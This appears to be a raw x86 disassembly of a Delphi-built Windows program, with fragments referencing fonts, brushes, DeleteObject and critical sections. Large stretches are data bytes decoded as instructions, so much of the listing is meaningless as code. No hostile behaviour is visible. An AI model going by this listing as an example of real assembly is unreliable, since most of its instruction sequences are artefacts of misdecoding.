add [ ecx - 0x1 ] ch
add [ eax ] al
push 0x6a004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx - 0x1 ] ch
add [ eax ] al
push 0x6c004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebp - 0x1 ] ch
add [ eax ] al
push 0x6e004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi - 0x1 ] ch
add [ eax ] al
push 0x50004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx - 0x1 ] dl
add [ eax ] al
push 0x52004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx - 0x1 ] dl
add [ eax ] al
push 0x54004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebp - 0x1 ] dl
add [ eax ] al
push 0x56004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi - 0x1 ] dl
add [ eax ] al
push 0x58004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx - 0x1 ] bl
add [ eax ] al
push 0x5a004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx - 0x1 ] bl
add [ eax ] al
push 0x5c004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebp - 0x1 ] bl
add [ eax ] al
push 0x5e004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi - 0x1 ] bl
add [ eax ] al
push 0x40004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx - 0x1 ] al
add [ eax ] al
push 0x42004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx - 0x1 ] al
add [ eax ] al
push 0x44004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebp - 0x1 ] al
add [ eax ] al
push 0x46004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi - 0x1 ] al
add [ eax ] al
push 0x48004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx - 0x1 ] cl
add [ eax ] al
push 0x4a004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx - 0x1 ] cl
add [ eax ] al
push 0x4c004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebp - 0x1 ] cl
add [ eax ] al
push 0x4e004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi - 0x1 ] cl
add [ eax ] al
push 0x30004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx ] dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edx ] dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx ] dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi + edi * 8 ] dh
add [ eax ] al
push 0x35004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ esi ] dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi ] dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ eax ] bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx ] bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edx ] bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx ] bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi + edi * 8 ] bh
add [ eax ] al
push 0x3d004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ esi ] bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi ] bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ eax ] ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ecx ] ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edx ] ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ ebx ] ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi + edi * 8 ] ah
add [ eax ] al
push 0x25004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ esi ] ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ edi ] ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_421d59
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421d60
retn
sub_421d6e
inc edx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
rcr [ 0x42 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ 0xc0042 ] 0x1
add [ eax ] al
jl r-xdata
xor [ eax ] eax
call 0x24425e5a
xor al [ eax ]
sbb [ ebp + 0x49 ] al
outsb
jbe r-xdata
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24425dfe
xor al [ eax ]
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ esi + ebx ] bp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx ] ch
inc edx
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
jae r-xdata
popad
insd
nop
mov al [ 0x100421e ]
or al 0x54
inc esi
push esp
je r-xdata
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
jae r-xdata
outsb
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
dec esp
push ds
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x421e9090
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax + 0x700421f ] cl
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
mov esp 0x300421e
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax + 0x1e ] cl
inc edx
add [ ecx ] cl
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
pop es
jo r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
or al 0x70
inc ebx
insb
popad
jb r-xdata
inc esp
outsd
je r-xdata
jo r-xdata
pop es
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
jo r-xdata
inc esp
push ds
inc edx
add [ ebx + 0x421f24c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
mov eax 0x8b00421e
shl [ edi + ebx ] 0x42
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x600421e ] bh
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x1f0cc08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
outsd
je r-xdata
pop eax
dec esi
jo r-xdata
inc esp
outsd
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax ] ah
pop ds
inc edx
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
add [ eax ] al
add [ eax ] al
xor al 0x21
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x421f8c90
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
inc ecx
add [ eax - 0x55 ] dl
inc ecx
add [ edx + ebp * 4 + 0x41 ] ah
inc eax
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
cmp [ edx - 0x54b7ffbf ] ch
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc edx
add [ eax ] bl
add [ eax ] al
add ah bh
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
jae r-xdata
popad
jae r-xdata
push es
jo r-xdata
insd
outsd
jo r-xdata
mov eax eax
dec eax
and [ edx ] al
add ecx [ ebx ]
push esp
inc edx
jb r-xdata
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
and [ edx ] eax
and [ ecx ] ah
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
ror [ eax + 0x20 ] 0x42
push 0x8b736369
push eax
outsb
dec esi
outsd
jo r-xdata
add eax 0x6f4e6d70
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov eax 0x600421e
popad
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
jo r-xdata
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x42 ] al
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
dec ebp
push eax
outsb
insb
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x3842613a
stosb [ edi ]
inc ecx
add [ eax - 0x55 ] cl
inc ecx
add [ esp + esi + 0x40 ] bh
outsb
je r-xdata
add [ edi ] cl
push esp
inc edi
jb r-xdata
inc edx
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dh
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ebx ] al
imul esp [ ebx + 0x73 ] 0x2048c08b
inc edx
or [ eax + 0x6d ] esi
or eax 0x654d6d70
jb r-xdata
jo r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xffff0001
nop
loopne r-xdata
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + esi + 0x21 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
add [ ecx ] 0x7c
xor al 0x40
add [ eax ] ah
and [ edx ] eax
sbb [ eax ] al
add [ eax ] al
cld
insb
nop
inc edi
or al 0x21
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
jb r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
dec ebp
popad
jae r-xdata
inc edx
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
and al [ edx ]
pop es
add eax 0x6e6f4654
je r-xdata
dec [ ecx + edi + 0x42 ]
add [ 0x6e6f4654 ] al
je r-xdata
add [ eax + eax ] ah
add [ eax ] al
shl [ eax ] 0x42
add [ esp + esi + 0x40 ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
and [ edx ] eax
adc [ edx ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bh
and [ edx ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + ecx + 0x21 ] si
inc edx
add [ eax - 0x7f ] dh
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
dec ebp
jb r-xdata
outsb
call [ esi + esi ]
inc edx
jo r-xdata
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x421e8c74
jo r-xdata
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
inc edx
and [ edx ] eax
xor [ ecx ] ah
push es
and al [ edx ]
and al 0x0
jo r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
popad
imul esp [ ebx + 0x73 ] 0x42210c90
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
pop esp
and eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ esp + edi + 0x3ccc0042 ] dh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
dec eax
push ds
inc edx
add [ ebp + edi + 0x3da40042 ] bl
inc edx
add [ ecx ] al
mov [ esi ] ds
inc edx
imul esp [ ebx + 0x73 ] 0x1e9c0007
inc edx
add ah cl
cmp eax 0x3dd40042
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
and [ edx ] al
jl r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
pushad
and [ edx ] eax
xchg esp eax
inc eax
inc edx
add [ eax + eax * 2 + 0x10042 ] bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax [ eax ]
add eax 0x74646957
push 0x245cc08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x42 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24 ] ch
inc edx
add [ eax ] bl
add [ eax ] al
add al al
and [ edx ] al
jl r-xdata
imul esp [ ebx + 0x73 ] 0x1d6c0004
inc edx
add [ eax - 0x6fffbdc1 ] cl
aas
inc edx
add [ ecx ] al
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x4042638a
inc edx
add [ eax - 0x55 ] cl
inc ecx
add [ eax - 0x55 ] dl
inc ecx
add [ eax + 0x3e ] ch
inc edx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x23 ] ch
inc edx
add [ eax + eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
sbb eax 0x180042
add bh bh
movsb [ edi ] [ esi ]
cmp al [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
add eax 0x6f6c6f43
jb r-xdata
pop esp
and [ edx ] eax
and [ eax ] al
add [ eax ] al
add [ eax ] eax
std
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2442620e
cmp [ edx ] eax
dec eax
stosd [ edi ]
inc ecx
add [ eax - 0x55 ] dl
inc ecx
add [ eax + 0x39 ] ch
inc edx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + 0x42 ] bl
inc eax
inc edx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x842648a
inc ecx
inc edx
add [ eax - 0x55 ] cl
inc ecx
add [ eax - 0x55 ] dl
inc ecx
add [ eax ] dh
inc ecx
inc edx
add [ esi ] al
push esp
inc edx
jb r-xdata
shl [ eax ] 0x42
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
pop ds
inc edx
add [ eax ] bl
add [ eax ] al
call [ eax + 0x40 ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x2065646f ] al
pop ds
inc edx
add [ eax + eax * 2 + 0x42 ] ah
add [ eax + eax * 2 + 0x42 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
push esp
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
inc edx
add [ eax + 0x100423f ] dl
inc edx
add [ edi ] al
add al 0x54
push eax
outsb
pop esp
and eax [ edx ]
xor [ ecx ] ah
inc edx
add [ eax + eax ] al
add eax 0x63746950
push r-xdata
sub [ 0x3d440042 ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
cmp eax 0x3d700042
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
add [ eax ] al
add [ eax + eax ] al
adc [ eax ] al
test [ edx + eax * 2 ] bh
add [ esp + edi + 0x10042 ] cl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
and eax 0x580042
jae r-xdata
add [ eax ] al
cld
add [ ecx ] 0x7c
xor al 0x40
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffff8442654e
inc esp
inc edx
add [ eax - 0x55 ] cl
inc ecx
add [ eax - 0x55 ] dl
inc ecx
add [ edx + ebp * 4 + 0x41 ] ah
add [ ebx + ecx * 2 ] dl
inc edx
add [ eax ] al
dec ebx
inc edx
add [ edx + ecx * 2 ] dh
inc edx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
jae r-xdata
jns r-xdata
jae r-xdata
inc esp
and eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
and al 0x42
add [ eax ] dh
and [ edx ] eax
add al [ eax ]
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x42 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
je r-xdata
add al 0x24
retn
outsd
or al 0x22
inc edx
add [ eax + eax ] cl
add bh bh
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
and eax 0x7070042
push esp
inc ebx
popad
outsb
jbe r-xdata
cmp [ 0x580042 ] ah
imul esp [ ebx + 0x73 ] 0x1d6c0002
inc edx
add [ eax + 0x42 ] ch
inc edx
add [ eax + 0x42 ] dh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
frstor [ edx ]
inc edx
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
movsb [ edi ] [ esi ]
inc edx
add [ esi ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
daa
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
daa
inc edx
add [ eax ] dl
daa
inc edx
add [ eax ] ch
add [ eax ] al
add ah ch
add [ ecx ] sub_40347c
or [ ecx + eax * 2 + 0x40348c00 ] ch
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x384266d2
stosb [ edi ]
inc ecx
add [ eax - 0x55 ] cl
inc ecx
add al bl
pop edi
inc edx
add [ edx + ebp * 4 + 0x41 ] ah
add [ eax + 0x680041ac ] bl
pop edi
inc edx
add [ edx + ebp ] ch
inc eax
add [ eax ] ah
inc edx
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ ecx + 0x42 ] ch
add [ eax + 0x61 ] dh
inc edx
add [ edx + ebp ] ch
inc eax
add al dh
popad
inc edx
add [ edx + ebp ] ch
inc eax
add [ edx + 0x42 ] dl
add [ eax + 0x62 ] bl
inc edx
add [ edx + ebp ] ch
inc eax
add [ eax + 0x62 ] ch
inc edx
add [ eax ] dh
pop edi
inc edx
add [ ecx + 0x42 ] dh
add ah bh
popad
inc edx
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add [ ecx ] al
add ch bh
dec eax
popad
inc edx
add [ eax ] cl
push esp
inc edi
jb r-xdata
and eax [ edx ]
adc [ eax ] al
add bh bh
call 0x1426819
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
int3
fmul [ eax + 0x42 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
jae r-xdata
inc edx
add [ eax ] bl
and [ edx ] al
test [ ebx + 0x42 ] al
add [ ebx + eax * 2 + 0x10042 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
and [ 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ecx
daa
inc edx
add [ edi + 0x27 ] bl
inc edx
add [ ecx + 0x27 ] ch
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add eax 0x73757242
push r-xdata
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
and eax 0x81700042
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
add [ ecx + 0x27 ] al
inc edx
add [ ecx + 0x27 ] cl
inc edx
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
daa
imul esp [ ebx - 0x73 ] 0x27200040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
add al 0xdc
jmp r-xdata
dec ebp
imul esp [ ebx + 0x73 ] 0x24700004
inc edx
add [ eax + eax ] dl
add bh bh
hlt
int 0xb8
jpe r-xdata
imul esp [ ebx - 0x5c ] 0x70004226
add [ ecx ] 0x0
add [ eax ] cl
inc edi
jb r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
add [ eax ] al
in al dx
add [ ecx ] sub_40347c
or [ ecx + eax * 2 + 0x40348c00 ] ch
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffa8426826
inc edx
add al bl
inc edx
add [ esp + ebp * 2 + 0x42 ] dl
add [ eax - 0x67ffbd97 ] bl
lodsb [ esi ]
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + 0x42 ] bl
add [ eax ] bl
add [ eax ] al
add [ edx ] al
add ch bh
inc edx
add [ eax ] bh
sub [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb ch [ eax ]
inc edx
add [ eax ] ch
sub [ edx ] al
sub al 0x0
sbb edx 0x0
aam 0x11
ror [ edi + 0x60 ] 0xb2
fnsave [ esi + 0x27 ]
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x4227f8c0 ] cl
jo r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
add [ edx + 0x4227 ] cl
add [ eax ] al
add [ eax ] cl
sub [ edx ] al
cmp [ eax ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bl
sub [ edx ] al
sub [ eax ] ch
inc edx
add [ eax + eax ] ch
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
clc
daa
inc edx
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_426968
pop ebp
retn 0x4
sub_422d2c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jae r-xdata
inc edx
add [ eax + eax ] ah
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffd8426da2
sub eax 0x54100042
push edx
xor eax 0xdb84fffe
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_422d9c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_422dd8
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_422e14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
